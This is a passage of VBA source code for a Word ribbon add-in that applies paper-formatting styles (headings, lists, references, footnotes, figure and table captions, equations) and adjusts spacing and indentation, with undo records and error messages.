       'If H2 directly follows H1, remove SpaceBefore from H2
       If Not .Paragraphs(1).Next Is Nothing Then
          If .Paragraphs(1).Next.Style = "heading2" Then
             .Paragraphs(1).Next.SpaceBefore = 0
          End If
       End If
    End With
    Application.ScreenRefresh
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (H1): " & Err.Description, vbCritical, C_TITLE
End If
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Public Sub H2(control As IRibbonControl)
'Applies the "heading2" style to max 1 paragraph
'Remove space before, if H2 directly follows H1
Dim ur  As UndoRecord

    On Error GoTo ERROR_HANDLER
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Apply 'H2' style"
    If Not ApplyParaStyle("heading2", 0, False) Then Err.Raise ERR_CANCEL
    With Selection
       'Remove space before, if H2 directly follows H1
       If Not .Paragraphs(1).Previous Is Nothing Then
          If .Paragraphs(1).Previous.Style = "heading1" Then
             .Paragraphs(1).SpaceBefore = 0
          End If
       End If
    End With
    Application.ScreenRefresh
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (H2): " & Err.Description, vbCritical, C_TITLE
End If
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Public Sub H3(control As IRibbonControl)
'Applies the built-in Heading 3 style to max 1 paragraph
'Remove vertical space before paragraph if H3 directly follows H2 or H1
Dim ur As UndoRecord
Dim SaveRange As Range

    On Error GoTo ERROR_HANDLER
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Apply 'H3' style"
    Set SaveRange = Selection.Range
    'Apply the built-in Heading 3 style (paragraph style)
    If Not ApplyParaStyle(vbNullString, wdStyleHeading3, False) Then Err.Raise ERR_CANCEL
    SaveRange.Select
    With Selection
       'Remove space before, if H3 directly follows H2 or H1
       If Not .Paragraphs(1).Previous Is Nothing Then
          If (.Paragraphs(1).Previous.Style = "heading2") Or (.Paragraphs(1).Previous.Style = "heading1") Then
             .Paragraphs(1).SpaceBefore = 0
          End If
       End If
       'If no text is selected, select the first sentence (or paragraph at maximum)
       If Selection.Start = Selection.End Then
          .Start = .Paragraphs(1).Range.Start
          'Look for the first full stop or paragraph end
          .MoveEndUntil "." & vbCrLf, wdForward
          'Include the full stop (if present)
          .MoveEndWhile ".", wdForward
       End If
       'Remove spaces (if present)
       .MoveEndWhile " ", wdBackward
       'Apply the char style "heading3" to the selected text
       If Not ApplyCharStyle("heading3", 0) Then Err.Raise ERR_CANCEL
       'Continue with body text
       If .Start = .End Then
          'Do nothing
       ElseIf Right(.Text, 1) <> "." Then
          .Collapse wdCollapseEnd
          .TypeText "."
          If .Text <> " " Then
             .Style = wdStyleDefaultParagraphFont
             .TypeText " "
          End If
       Else
          .Collapse wdCollapseEnd
          .Style = wdStyleDefaultParagraphFont
       End If
    End With
    Application.ScreenRefresh
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (H3): " & Err.Description, vbCritical, C_TITLE
End If
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Public Sub H4(control As IRibbonControl)
'Applies the built-in Heading 4 style to max 1 paragraph
'Remove vertical space before paragraph if H4 directly follows H3, H2, or H1
Dim ur As UndoRecord
Dim SaveRange As Range

    On Error GoTo ERROR_HANDLER
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Apply 'H4' style"
    Set SaveRange = Selection.Range
    'Apply the built-in Heading 4 style (paragraph style)
    If Not ApplyParaStyle(vbNullString, wdStyleHeading4, False) Then Err.Raise ERR_CANCEL
    SaveRange.Select
    With Selection
       'Remove space before, if H4 directly follows H3, H2 or H1
       If Not .Paragraphs(1).Previous Is Nothing Then
          If (.Paragraphs(1).Previous.Style = "heading3") Or (.Paragraphs(1).Previous.Style = "heading2") Or (.Paragraphs(1).Previous.Style = "heading1") Then
             .Paragraphs(1).SpaceBefore = 0
          End If
       End If
       'If no text is selected, select the first sentence (or paragraph at maximum)
       If Selection.Start = Selection.End Then
          .Start = .Paragraphs(1).Range.Start
          'Look for the first full stop or paragraph end
          .MoveEndUntil "." & vbCrLf, wdForward
          'Include the full stop (if present)
          .MoveEndWhile ".", wdForward
       End If
       'Remove spaces (if present)
       .MoveEndWhile " ", wdBackward
       'Apply the char style "heading4" to the selected text
       If Not ApplyCharStyle("heading4", 0) Then Err.Raise ERR_CANCEL
       'Continue with body text
       If .Start = .End Then
          'Do nothing
       ElseIf Right(.Text, 1) <> "." Then
          .Collapse wdCollapseEnd
          .TypeText "."
          If .Text <> " " Then
             .Style = wdStyleDefaultParagraphFont
             .TypeText " "
          End If
       Else
          .Collapse wdCollapseEnd
          .Style = wdStyleDefaultParagraphFont
       End If
    End With
    Application.ScreenRefresh
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (H4): " & Err.Description, vbCritical, C_TITLE
End If
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Public Sub MakeBulletItem(control As IRibbonControl)
'Applies the "bulletitem" style
'Remove SpaceAfter/SpaceBefore from a preceeding or following "numitem"
Dim ur              As UndoRecord
Dim objLastSelPara  As Paragraph

    On Error GoTo ERROR_HANDLER
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Apply 'bulletitem' style"
    Set objLastSelPara = Selection.Paragraphs(Selection.Paragraphs.Count)
    'Apply the "bulletitem" style
    If Not ApplyParaStyle("bulletitem", 0, True) Then Err.Raise ERR_CANCEL
    With Selection
       If Not .Paragraphs(1).Previous Is Nothing Then
          If .Paragraphs(1).Previous.Style = "numitem" Then
             .Paragraphs(1).SpaceBefore = 0
          End If
       End If
       If Not objLastSelPara.Next Is Nothing Then
          If objLastSelPara.Next.Style = "numitem" Then
             objLastSelPara.SpaceAfter = 0
          End If
       End If
    End With
    Application.ScreenRefresh
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (MakeBulletItem): " & Err.Description, vbCritical, C_TITLE
End If
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Public Sub MakeDashItem(control As IRibbonControl)
'Applies the "dashitem" style
'Remove SpaceAfter/SpaceBefore from a preceeding or following "numitem"
Dim ur              As UndoRecord
Dim objLastSelPara  As Paragraph

    On Error GoTo ERROR_HANDLER
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Apply 'dashitem' style"
    Set objLastSelPara = Selection.Paragraphs(Selection.Paragraphs.Count)
    'Apply the "dashitem" style
    If Not ApplyParaStyle("dashitem", 0, True) Then Err.Raise ERR_CANCEL
    With Selection
       If Not .Paragraphs(1).Previous Is Nothing Then
          If .Paragraphs(1).Previous.Style = "numitem" Then
             .Paragraphs(1).Previous.SpaceAfter = 0
          End If
       End If
       If Not objLastSelPara.Next Is Nothing Then
          If objLastSelPara.Next.Style = "numitem" Then
             objLastSelPara.Next.SpaceBefore = 0
          End If
       End If
    End With
    Application.ScreenRefresh
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (MakeDashItem): " & Err.Description, vbCritical, C_TITLE
End If
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Public Sub MakeNumItem(control As IRibbonControl)
'Applies the "numitem" style
'Removes SpaceBefore from the first paragraph, if the preceeding style is "dashitem" or "bulletitem"
'Removes SpaceAfter from the last paragraph, if "dashitem" or "bulletitem" follows
'Adjust the indent to the number of "numitem" paragraph in the current group
Dim ur              As UndoRecord
Dim objLastNumPara  As Paragraph

    On Error GoTo ERROR_HANDLER
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Apply 'numitem' style"
    'Save the first and last paragraph
    Set objLastNumPara = Selection.Paragraphs(Selection.Paragraphs.Count)
    'Apply the "numitem" style
    If Not ApplyParaStyle("numitem", 0, True) Then Err.Raise ERR_CANCEL
    'Adjust the spacing to preceding or following itemizations
    With Selection
       If Not .Paragraphs(1).Previous Is Nothing Then
          If (objLastNumPara.Previous.Style = "bulletitem") Or (objLastNumPara.Previous.Style = "dashitem") Then
             .Paragraphs(1).SpaceBefore = 0
          End If
       End If
       If Not objLastNumPara.Next Is Nothing Then
          If (objLastNumPara.Next.Style = "bulletitem") Or (objLastNumPara.Next.Style = "dashitem") Then
             objLastNumPara.SpaceAfter = 0
          End If
       End If
    End With
    CalcNumIndent Selection.Paragraphs(1), Selection.Paragraphs(Selection.Paragraphs.Count)
    Application.ScreenRefresh
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (MakeNumItem): " & Err.Description, vbCritical, C_TITLE
End If
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Private Sub CalcNumIndent(ByRef objFirstNumPara As Paragraph, ByRef objLastNumPara As Paragraph)
Dim objRange As Range

    'Check for valid input
    If objFirstNumPara Is Nothing Then Exit Sub
    If objLastNumPara Is Nothing Then Exit Sub
    'Only calculate indents for list level 1
    If ActiveDocument.Range(objFirstNumPara.Range.Start, objLastNumPara.Range.End).ListFormat.ListLevelNumber <> 1 Then Exit Sub
    'Check for "numitem" paragraphs before the current selection
    Do
       If objFirstNumPara.Previous Is Nothing Then Exit Do
       If objFirstNumPara.Previous.Style <> "numitem" Then Exit Do
       If objFirstNumPara.Previous.Range.ListFormat.ListLevelNumber <> 1 Then Exit Do
       Set objFirstNumPara = objFirstNumPara.Previous
    Loop
    'Check for "numitem" paragraphs after the current selection
    Do
       If objLastNumPara.Next Is Nothing Then Exit Do
       If objLastNumPara.Next.Style <> "numitem" Then Exit Do
       If objLastNumPara.Next.Range.ListFormat.ListLevelNumber <> 1 Then Exit Do
       Set objLastNumPara = objLastNumPara.Next
    Loop
    With ActiveDocument.Range(objFirstNumPara.Range.Start, objLastNumPara.Range.End)
       Select Case .Paragraphs.Count
          Case Is < 10
             .ParagraphFormat.LeftIndent = CentimetersToPoints(0.4)
             .ParagraphFormat.FirstLineIndent = -CentimetersToPoints(0.1)
          Case Is < 100
             .ParagraphFormat.LeftIndent = CentimetersToPoints(0.55)
             .ParagraphFormat.FirstLineIndent = -CentimetersToPoints(0.1)
          Case Else
             .ParagraphFormat.LeftIndent = CentimetersToPoints(0.7)
             .ParagraphFormat.FirstLineIndent = -CentimetersToPoints(0.1)
       End Select
    End With

End Sub

Public Sub ListLevelUp(control As IRibbonControl)
'Increases the current list level, i.e. the indentation
'Only available for lists
Dim ur  As UndoRecord

    On Error GoTo ERROR_HANDLER
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Increase list level"
    If Selection.Style Is Nothing Then
       Err.Raise ERR_USRMSG, , "Please only select paragraphs of the same style!"
    End If
    Select Case Selection.ParagraphFormat.Style
       Case "bulletitem", "dashitem", "numitem"
          If Selection.Range.ListFormat.ListLevelNumber > 9 Then
             Err.Raise ERR_USRMSG, , "Please only select paragraphs of the same list level!"
          ElseIf Selection.Range.ListFormat.ListLevelNumber > 6 Then
             Err.Raise ERR_USRMSG, , "The maximum level was reached!"
          End If
          Selection.Range.ListFormat.ListLevelNumber = Selection.Range.ListFormat.ListLevelNumber + 1
       Case Else
          Err.Raise ERR_USRMSG, , "This function is only available for numbered and unnumbered lists!"
    End Select
    Application.ScreenRefresh
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (ListLevelUp): " & Err.Description, vbCritical, C_TITLE
End If
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Public Sub ListLevelDown(control As IRibbonControl)
'Decreases the current list level, i.e. the indentation
'Only available for lists
Dim ur  As UndoRecord

    On Error GoTo ERROR_HANDLER
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Decrease list level"
    If Selection.Style Is Nothing Then
       Err.Raise ERR_USRMSG, , "Please only select paragraphs of the same style!"
    End If
    Select Case Selection.ParagraphFormat.Style
       Case "bulletitem", "dashitem"
          If Selection.Range.ListFormat.ListLevelNumber < 2 Then Err.Raise ERR_CANCEL
          Selection.Range.ListFormat.ListLevelNumber = Selection.Range.ListFormat.ListLevelNumber - 1
       Case "numitem"
          If Selection.Range.ListFormat.ListLevelNumber < 2 Then Err.Raise ERR_CANCEL
          Selection.Range.ListFormat.ListLevelNumber = Selection.Range.ListFormat.ListLevelNumber - 1
          CalcNumIndent Selection.Paragraphs(1), Selection.Paragraphs(Selection.Paragraphs.Count)
       Case Else
          Err.Raise ERR_USRMSG, , "This function is only available for numbered and unnumbered lists!"
    End Select
    Application.ScreenRefresh
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (ListLevelDown): " & Err.Description, vbCritical, C_TITLE
End If
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Public Sub RestartNumbering(control As IRibbonControl)
'Restarts the numbering (if in a numbered list) from the first selected paragraphs
Dim ur      As UndoRecord
Dim objLF   As ListFormat

    On Error GoTo ERROR_HANDLER
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Restart numbering"
    Selection.Collapse wdCollapseStart
    If Selection.Paragraphs.Count < 1 Then Err.Raise ERR_CANCEL
    Set objLF = Selection.Paragraphs(1).Range.ListFormat
    If objLF Is Nothing Then
       Err.Raise ERR_USRMSG, , "This function is only available for automatically numbered lists!"
    ElseIf objLF.ListTemplate Is Nothing Then
       Err.Raise ERR_USRMSG, , "This function is only available for automatically numbered lists!"
    End If
    If objLF.ListValue > 1 Then
       objLF.ApplyListTemplate objLF.ListTemplate, False, wdListApplyToWholeList
    Else
       objLF.ApplyListTemplate objLF.ListTemplate, True, wdListApplyToWholeList
    End If
    CalcNumIndent Selection.Paragraphs(1), Selection.Paragraphs(Selection.Paragraphs.Count)
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (RestartNumbering): " & Err.Description & vbCrLf & "(This error might happen, if you use custom numbered lists instead of the built-in numbering template.)", vbCritical, C_TITLE
End If
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Public Sub MakeStandard(control As IRibbonControl)
'1. Different styles selected -> apply the default paragraph style
'2. The font is not the paragraph standard -> apply the default character format
'3. Part of a paragraph selection -> apply the default character format
'4. All other cases: apply the default paragraph style, if not yet present. If present, apply the default character format
'The default paragraph format can be "p1a" or "normal", depending from the context
Dim ur                  As UndoRecord
Dim booApplyCharFormat  As Boolean
Dim objFirstPara        As Paragraph
Dim objRangeSave        As Range

    On Error GoTo ERROR_HANDLER
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Apply 'normal text' style"
    If Selection.ParagraphFormat.Style Is Nothing Then
       booApplyCharFormat = False
    ElseIf (Selection.Font.Name <> Selection.ParagraphFormat.Style.Font.Name) Or _
       (Selection.Font.Italic <> Selection.ParagraphFormat.Style.Font.Italic) Or _
       (Selection.Font.Bold <> Selection.ParagraphFormat.Style.Font.Bold) Then
       booApplyCharFormat = True
    ElseIf Selection.Start = Selection.End Then
       booApplyCharFormat = False
    ElseIf InStr(1, Selection.Text, Chr$(13)) = 0 Then
       booApplyCharFormat = True
    Else
       booApplyCharFormat = False
    End If
    Set objRangeSave = Selection.Range
    If booApplyCharFormat Then
       ApplyCharStyle vbNullString, wdStyleDefaultParagraphFont
    Else
       NormalSpacing control
       'Separate the first paragraph
       Set objFirstPara = Selection.Paragraphs(1)
       If objFirstPara Is Nothing Then Err.Raise ERR_CANCEL
       'If more than one paragraph is selected, first format the rest of the selection
       If Selection.End > objFirstPara.Range.End Then
          Selection.MoveStart wdParagraph, 1
          ApplyParaStyle vbNullString, wdStyleNormal, True
       End If
       objFirstPara.Range.Select
       If objFirstPara.Previous Is Nothing Then
          If Selection.Style = ActiveDocument.Styles(wdStyleNormal).NameLocal Then
             ApplyCharStyle vbNullString, wdStyleDefaultParagraphFont
          Else
             ApplyParaStyle vbNullString, wdStyleNormal, True
          End If
       Else
          Select Case objFirstPara.Previous.Range.ParagraphFormat.Style
             Case "heading1", "heading2", "dashitem", "bulletitem", "numitem", "figurecaption", "tablecaption", "equation", "programcode"
                If Selection.Style = "p1a" Then
                   ApplyCharStyle vbNullString, wdStyleDefaultParagraphFont
                Else
                   ApplyParaStyle "p1a", 0, True
                End If
             Case Else
                If Selection.Style = ActiveDocument.Styles(wdStyleNormal).NameLocal Then
                   ApplyCharStyle vbNullString, wdStyleDefaultParagraphFont
                Else
                   ApplyParaStyle vbNullString, wdStyleNormal, True
                End If
          End Select
       End If
    End If
    objRangeSave.Select
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (MakeStandard): " & Err.Description, vbCritical, C_TITLE
End If
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Public Sub InsertFN(control As IRibbonControl)
'Inserts a footnote and adds a comma (footnote separator), if the last character is a footnote char as well
'Blocks footnotes for the "author", "address", "e-mail", "abstract", "keywords" styles
'Turns the footnote number to a symbol, if in "papertitle" oder "papersubtitle"
Dim ur          As UndoRecord
Dim strFNChar   As String

    On Error GoTo ERROR_HANDLER
    ActiveDocument.ActiveWindow.View = wdPrintView
    If ActiveDocument.ActiveWindow.View.SeekView <> wdSeekMainDocument Then
       Exit Sub
    End If
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Insert footnote"
    With Selection
       .Collapse wdCollapseEnd
       Select Case .Paragraphs(1).Style
          Case "papertitle", "papersubtitle"
             'Choose the next footnote symbol
             Select Case .Paragraphs(1).Range.Footnotes.Count
                Case 0
                   strFNChar = "*"
                Case 1
                   strFNChar = "**"
                Case 2
                   strFNChar = "***"
                Case 3
                   strFNChar = ChrW(8224)
                Case 4
                   strFNChar = ChrW(8225)
                Case 5
                   strFNChar = ChrW(167)
                Case 6
                   strFNChar = ChrW(176)
                Case Else
                   Err.Raise ERR_USRMSG, , "The maximum number of footnotes in this paragraph has been reached!"
             End Select
             'Ignore spaces
             .MoveStartWhile " ", wdBackward
             'If the preceeding character is a superscript and no comma (probably a footnote), insert a footnote separator
             If Not .Characters(1).Previous Is Nothing Then
                If (.Characters(1).Previous.Font.Superscript) And (.Characters(1).Previous.Text <> ",") Then
                   .Font.Superscript = True
                   .Font.Position = 2
                   .TypeText ","
                   .Font.Superscript = False
                   .Font.Position = 0
                End If
             End If
             'Add the footnote and start with a tab
             .Footnotes.Add .Range, strFNChar
             .TypeText vbTab
          Case "author", "address", "e-mail", "abstract", "keywords"
             Err.Raise ERR_USRMSG, , "Footnotes to author names, address elements and within the abstract and keywords are not supported." & _
                    vbCrLf & "Please consider adding your remark as a footnote to the title!"
          Case Else
             'Ignore spaces
             .MoveStartWhile " ", wdBackward
             'If the preceeding character is a footnote, insert a footnote separator
             If Not .Characters(1).Previous Is Nothing Then
                If AscW(.Characters(1).Previous) = 2 Then
                   .Font.Superscript = True
                   .TypeText ","
                   .Font.Superscript = False
                End If
             End If
             'Add the footnote and start with a tab
             .Footnotes.Add .Range
             .TypeText vbTab
       End Select
    End With
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (InsertFootnote): " & Err.Description, vbCritical, C_TITLE
End If
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Public Sub MakeRefItem(control As IRibbonControl)
'Applies the "referenceitem" style to the selected paragraphs
'Counts the reference paragraphs and adjusts the indentation according to the highest reference counter
Dim ur              As UndoRecord
Dim objFirstRefPara As Paragraph
Dim objLastRefPara  As Paragraph

    On Error GoTo ERROR_HANDLER
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Apply 'referenceitem' style"
    ApplyParaStyle "referenceitem", 0, True
    Set objFirstRefPara = Selection.Paragraphs(1)
    Set objLastRefPara = Selection.Paragraphs(1)
    'Check for reference paragraphs before the current selection
    Do
       If objFirstRefPara.Previous Is Nothing Then Exit Do
       If objFirstRefPara.Previous.Style <> "referenceitem" Then Exit Do
       Set objFirstRefPara = objFirstRefPara.Previous
    Loop
    'Check for reference paragraphs after the current selection
    Do
       If objLastRefPara.Next Is Nothing Then Exit Do
       If objLastRefPara.Next.Style <> "referenceitem" Then Exit Do
       Set objLastRefPara = objLastRefPara.Next
    Loop
    'Adjust the indentation
    With ActiveDocument.Styles("referencelist").ListTemplate.ListLevels(1)
       Select Case ActiveDocument.Range(objFirstRefPara.Range.Start, objLastRefPara.Range.End).Paragraphs.Count
          Case Is < 10
             .NumberPosition = CentimetersToPoints(0.2)
             .TextPosition = CentimetersToPoints(0.4)
             .TabPosition = CentimetersToPoints(0.4)
          Case Is > 100
             .NumberPosition = CentimetersToPoints(0.6)
             .TextPosition = CentimetersToPoints(0.8)
             .TabPosition = CentimetersToPoints(0.8)
          Case Else
             .NumberPosition = CentimetersToPoints(0.4)
             .TextPosition = CentimetersToPoints(0.6)
             .TabPosition = CentimetersToPoints(0.6)
       End Select
       ActiveDocument.Styles("referenceitem").LinkToListTemplate ActiveDocument.Styles("referencelist").ListTemplate, 1
    End With
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (MakeRefItem): " & Err.Description, vbCritical, C_TITLE
End If
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Public Sub AddVerticalSpace(control As IRibbonControl)
'Adds 6pt space above the first selected paragraph
Dim ur  As UndoRecord

    On Error GoTo ERROR_HANDLER
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Add vertical space"
    Selection.Paragraphs(1).Range.ParagraphFormat.SpaceBefore = Selection.Paragraphs(1).Range.ParagraphFormat.SpaceBefore + 6
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (AddVerticalSpace): " & Err.Description, vbCritical, C_TITLE
End If
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Public Sub ClearVerticalSpace(control As IRibbonControl)
'Removes space above and below the selected paragraphs
Dim ur      As UndoRecord
Dim objPara As Paragraph

    On Error GoTo ERROR_HANDLER
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Clear vertical space"
    For Each objPara In Selection.Paragraphs
       objPara.Range.ParagraphFormat.SpaceBefore = 0
       objPara.Range.ParagraphFormat.SpaceAfter = 0
    Next
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (ClearVerticalSpace): " & Err.Description, vbCritical, C_TITLE
End If
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Public Sub InsertImage(control As IRibbonControl)
'1. Collapses any existing selection to the end
'2. If the cursor is not in an empty paragraph: go to the paragraph's end and type a new paragraph
'3. Apply the "image style"
'4. Shows the insert image dialog
Dim ur  As UndoRecord
Dim objDialog As dialog

    On Error GoTo ERROR_HANDLER
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Insert image"
    With Selection
       .Collapse wdCollapseEnd
       If .Start < .Paragraphs(1).Range.End - 1 Then
          'Cursor is before the paragraph's end: move it to the end
          .Start = .Paragraphs(1).Range.End - 1
          'Type a new paragraph
          .TypeParagraph
       ElseIf .Paragraphs(1).Range.Start <> .Paragraphs(1).Range.End - 1 Then
          'Cursor is at the end of the paragraph, and the paragraph is not empty: type a new paragraph
          .TypeParagraph
       End If
       'Apply the style
       .Style = "image"
    End With
    Set objDialog = Dialogs(wdDialogInsertPicture)
    With objDialog
       If .Display Then
          Selection.Collapse wdCollapseStart
          ActiveDocument.InlineShapes.AddPicture .Name, False, True, Selection.Range
       End If
    End With
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (InsertImage): " & Err.Description, vbCritical, C_TITLE
End If
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Public Sub MakeFigCaption(control As IRibbonControl)
'Applies the "figurecaption" style to max 1 paragraph
'Select and delete the first word of the paragraph plus the following period or space, if it's like "Fig*"
'Type "Fig. " plus number field
Dim ur  As UndoRecord

    On Error GoTo ERROR_HANDLER
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Make figure caption"
    If Not ApplyParaStyle("figurecaption", 0, False) Then Err.Raise ERR_CANCEL
    With Selection
       'Select "Fig. X." mark, if present
       If Trim(.Paragraphs(1).Range.Words(1).Text) Like "Fig*" Then
          .Paragraphs(1).Range.Words(1).Select
          .MoveEndWhile ".: ", wdForward
          .MoveEndWhile ".:0123456789", wdForward
          .Delete
       End If
       ApplyCharStyle vbNullString, wdStyleDefaultParagraphFont
       Selection.Collapse wdCollapseStart
       'Rewrite the "Fig X." mark
       .Font.Bold = True
       .TypeText "Fig. "
       .Fields.Add .Range, wdFieldEmpty, "SEQ ""Figure""", True
       .TypeText "."
       .Font.Bold = False
       .TypeText " "
       'Check whether we have more than one line. If so, change the alignment to justified
       .EndKey wdLine, wdMove
       If .IPAtEndOfLine Then
          .ParagraphFormat.Alignment = wdAlignParagraphJustify
       End If
    End With
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (MakeFigCaption): " & Err.Description, vbCritical, C_TITLE
End If
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Public Sub MakeTableCaption(control As IRibbonControl)
'Applies the "tablecaption" style to max 1 paragraph
'Select and delete the first word of the paragraph plus the following period or space, if it's like "Table*"
'Type "Table " plus number field
Dim ur  As UndoRecord

    On Error GoTo ERROR_HANDLER
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Make table caption"
    If Not ApplyParaStyle("tablecaption", 0, False) Then Err.Raise ERR_CANCEL
    With Selection
       'Select "Table X." mark, if present
       If Trim(.Paragraphs(1).Range.Words(1).Text) Like "Tab*" Then
          .Paragraphs(1).Range.Words(1).Select
          .MoveEndWhile ".: ", wdForward
          .MoveEndWhile ".:0123456789", wdForward
          .Delete
       End If
       ApplyCharStyle vbNullString, wdStyleDefaultParagraphFont
       Selection.Collapse wdCollapseStart
       'Rewrite the "Table X." mark
       .Font.Bold = True
       .TypeText "Table "
       .Fields.Add .Range, wdFieldEmpty, "SEQ ""Table""", True
       .TypeText "."
       .Font.Bold = False
       .TypeText " "
       'Check whether we have more than one line. If so, change the alignment to justified
       .EndKey wdLine, wdMove
       If .IPAtEndOfLine Then
          .ParagraphFormat.Alignment = wdAlignParagraphJustify
       End If
    End With
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (MakeTableCaption): " & Err.Description, vbCritical, C_TITLE
End If
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Public Sub MakeEquation(control As IRibbonControl)
'Applies the "equation" style
'Opens the equation editor, if we are in a new paragraph
Static booSkipMissEqWarn    As Boolean
Dim ur                      As UndoRecord

    On Error GoTo ERROR_HANDLER
    Set ur = Application.UndoRecord
    ur.StartCustomRecord "Apply 'equation' style"
    If Not ApplyParaStyle("equation", 0, False) Then Err.Raise ERR_CANCEL
    With Selection
       'Select spaces and tabs at the beginning of the paragraph
       .MoveEndWhile " " & vbTab, wdForward
       'Type a tab to center the equation
       .TypeText vbTab
    End With
    ur.EndCustomRecord
    Exit Sub

ERROR_HANDLER:
If Err.Number = ERR_USRMSG Then
   MsgBox Err.Description, vbExclamation, C_TITLE
ElseIf Err.Number <> ERR_CANCEL Then
   MsgBox "An error has occurred (MakeEquation): " & Err.Description, vbCritical, C_TITLE
End If
If Not (ur Is Nothing) Then ur.EndCustomRecord
End Sub

Public Sub AddEqCounter(control As IRibbonControl)
Dim ur          As UndoRecord
Dim objField    As Field
